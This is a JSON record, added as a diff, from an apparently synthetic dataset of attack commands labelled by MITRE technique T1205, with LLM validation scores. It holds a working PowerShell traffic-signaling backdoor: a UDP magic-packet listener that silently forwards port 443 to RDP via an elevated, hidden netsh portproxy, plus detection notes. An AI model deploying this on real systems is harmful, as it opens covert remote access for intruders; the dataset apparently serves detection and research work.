@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $port=49160; $udp=New-Object System.Net.Sockets.UdpClient($port); $ep=New-Object System.Net.IPEndPoint([IPAddress]::Any,0); $data=$udp.Receive([ref]$ep); $udp.Close(); $msg=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($data))); if($msg -eq 'OPENPROXY:443->3389'){ Start-Process -FilePath 'netsh' -ArgumentList 'interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1' -WindowStyle Hidden -Verb RunAs | Out-Null } }",
+  "explanation": "Listens for a single UDP magic packet (base64) and, upon matching 'OPENPROXY:443->3389', creates a portproxy to forward 443 to local 3389, effectively exposing RDP via TLS port (traffic signaling to enable access). Detection: monitor netsh portproxy changes and new listeners on 443; detect UDP to high ephemeral ports with base64 content; require admin/UAC elevation to create portproxy.",
+  "rationale_steps": [
+    "Receive a magic packet and decode base64 instruction.",
+    "On match, use netsh portproxy to expose a hidden service via a common port.",
+    "Highlight detection via auditing netsh configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-41a9035c",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced braces/quotes, valid .NET calls ([UdpClient], [ipaddress], Encoding/Convert), and proper separators, so it should parse and run.",
+        "semantic_score": 5,
+        "semantic_justification": "It listens for a base64-encoded UDP magic packet and, on matching the trigger, elevates to configure a netsh portproxy from 443 to 3389, which is a plausible Traffic Signaling implementation aligned with T1205 (assuming elevation succeeds).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T17:55:20.632858Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, uses proper PowerShell syntax for object creation, method calls, conditional logic, and external process execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1205 Traffic Signaling technique by listening for a specific base64-encoded UDP signal to trigger a system configuration change (port proxy), demonstrating a clear operational use case for command and control signaling.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T17:55:42.704937Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
